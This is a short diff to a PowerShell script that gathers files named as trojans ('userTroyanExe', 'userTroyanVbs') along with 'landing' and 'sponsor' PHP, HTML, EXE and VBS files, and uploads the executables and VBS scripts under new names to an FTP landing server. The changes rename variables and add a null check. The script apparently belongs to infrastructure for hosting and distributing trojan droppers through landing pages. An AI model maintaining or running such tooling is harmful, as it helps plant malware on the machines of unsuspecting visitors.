@@ -24,8 +24,8 @@ if ($server.landingAuto -eq $false)
 $ftpStorage=$server.landingFtp
 
 $files = @(
-$server.userTroyanExe, $server.userPhpExeFile, $server.userSponsorPhpExeFile, $server.userSponsorHtmlExeFile
-$server.userVbsFile, $server.userPhpVbsFile, $server.userSponsorPhpVbsFile, $server.userSponsorHtmlVbsFile
+$server.userTroyanExe, $server.landingPhpExeFile, $server.landingSponsorPhpExeFile, $server.landingSponsorHtmlExeFile
+$server.userTroyanVbs, $server.landingPhpVbsFile, $server.landingSponsorPhpVbsFile, $server.landingSponsorHtmlVbsFile
 )
 
 $landingName = $server.landingName
@@ -75,8 +75,10 @@ $ftpPassword = $ftpUri.UserInfo.Split(':')[1]
 Create-FtpDirectory -ftpUrl $ftpBaseUrl -ftpUsername $ftpUsername -ftpPassword $ftpPassword -directory $ftpPath
 
 # Upload files with new names
-foreach ($file in $files) {
-    if (Test-Path $file) {
+foreach ($file in $files) 
+{
+    if (([string]::IsNullOrEmpty($file) -eq $false) -and (Test-Path $file)) 
+    {
         $ext =  [System.IO.Path]::GetExtension($file)
         if ($ext -eq ".exe" -or $ext -eq ".vbs")
         {
